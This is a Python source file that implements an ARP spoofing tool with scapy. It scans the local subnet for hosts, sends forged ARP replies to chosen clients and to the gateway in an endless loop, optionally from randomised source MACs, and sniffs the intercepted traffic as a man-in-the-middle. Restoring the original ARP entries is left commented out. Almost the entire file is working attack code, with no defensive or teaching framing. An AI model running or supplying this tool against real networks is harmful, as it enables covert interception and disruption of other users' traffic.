import random
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import netifaces
from logging import getLogger
import time
# from scapy.layers.inet import IP, ICMP

logger = getLogger(__name__)


class ARPSpoofer:
    def __init__(self):
        try:
            self.interface = netifaces.gateways()["default"][netifaces.AF_INET][1]
            self.gateway_ip = netifaces.gateways()["default"][netifaces.AF_INET][0]
            self.gateway_mac = sr1(ARP(pdst=self.gateway_ip), timeout=3, verbose=False).hwsrc
            self.subnet_mask = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]["netmask"]
            self.host_ip = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]["addr"]
            self.host_mac = netifaces.ifaddresses(self.interface)[netifaces.AF_LINK][0]["addr"]
            self.spoofing_clients = []
        except Exception as e:
            print(e)
            sys.exit(0)

    def scan_network(self, scanning_method='arp'):
        if scanning_method == "arp":
            octets = self.subnet_mask.split(".")
            binary_mask = "".join([bin(int(octet))[2:].zfill(8) for octet in octets])
            host_bits = 0
            for bit in binary_mask:
                if bit == "1":
                    host_bits += 1
                else:
                    break

            network_ip = self.gateway_ip + "/" + str(host_bits)
            logger.debug(f"Running scan on network address: {network_ip}")

            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_ip)

            result = srp(arp_request, timeout=3, verbose=False)[0]
            arp_responses = {}
            for _, received in result:
                arp_responses[received.psrc] = received.hwsrc
            logger.debug("IP\t\tMAC")
            for client in arp_responses.keys():
                logger.debug(f'{client}\t{arp_responses[client]}')
            return arp_responses
        elif scanning_method == 'nmap':
            pass

    def report_net_status(self, scanning_method='arp'):
        return {
            "gateway_ip": self.gateway_ip,
            "gateway_mac": self.gateway_mac,
            "interface": self.interface,
            "subnet_mask": self.subnet_mask,
            "host_ip": self.host_ip,
            "host_mac": self.host_mac,
            'scanned_hosts': self.scan_network(scanning_method)
        }

    def spoof_client(self, client_ip, attack_type):
        packet = ARP(pdst=client_ip)
        response = None
        try_count = 0
        while response == None and try_count < 5:
            response = sr1(packet, timeout=3, verbose=False)
            try_count += 1

        if response is None:
            raise ScapyNoDstMacException

        self.spoofing_clients.append(
            {"original_IP": client_ip, "original_MAC": response.hwsrc, "attack_type": attack_type}
        )
        logger.debug("Client added to spoofed_clients list")

    def remove_spoof_client(self, client_ip):
        for client in self.spoofing_clients:
            if client['original_IP'] == client_ip:
                self.spoofing_clients.remove(client)
                logger.debug("Client removed from spoofing clients list")
                break
        logger.debug("Didn't found client with given ip in spoofed clients list")

    def _create_and_send_spoofed_packets(self, client, spoof_source=False):
        logger.debug("Creating and sending packets for spoofing")
        client_ip = client['original_IP']
        client_mac = client['original_MAC']

        host_mac = self.host_mac
        if spoof_source:
            mac = [random.randint(0x00, 0xFF) for _ in range(6)]
            mac[0] &= 0xFE  # Ensure the MAC address is unicast and not multicast
            host_mac = ":".join(map(lambda x: "%02x" % x, mac))

        client_packet = Ether(dst=client_mac, src=host_mac) / ARP(
            pdst=client_ip, psrc=self.gateway_ip
        )
        sendp(client_packet, verbose=False)
        gateway_packet = Ether(dst=self.gateway_mac, src=host_mac) / ARP(
            pdst=self.gateway_ip, psrc=client_ip
        )
        sendp(gateway_packet, verbose=False)
        logger.debug(f"Packets sent: {[client_packet.summary(), gateway_packet.summary()]}")

    def spoofing_func(self, spoof_source=False):
        logger.debug("Spoofing these clients")
        logger.debug(self.spoofing_clients)
        while True:
            for client in self.spoofing_clients:
                self._create_and_send_spoofed_packets(client, spoof_source)                
            time.sleep(2)

    def mitm_packet_handler(self, pkt):
        print(pkt.summary())
    def mitm_func(self):
        sniff(prn = self.mitm_packet_handler)

    # def _create_original_packets(self, client_ip, client_mac):
    #     logger.debug("Creating packets for restoring original IP-MAC")

    #     gateway_ip = self.gateway_ip
    #     gateway_mac = self.gateway_mac

    #     packets = []
    #     client_packet = Ether(dst=ETHER_BROADCAST, src=client_mac) / ARP(
    #         pdst=client_ip, psrc=gateway_ip
    #     )
    #     gateway_packet = Ether(dst=ETHER_BROADCAST, src=gateway_mac) / ARP(
    #         pdst=gateway_ip, psrc=client_ip
    #     )

    #     packets.append(client_packet)
    #     packets.append(gateway_packet)

    #     logger.debug(f"Packets generated: {packets}")

    #     return packets


# packets = self._create_original_packets(client['IP'],client['MAC'])
# [sendp(x, verbose=False) for x in packets]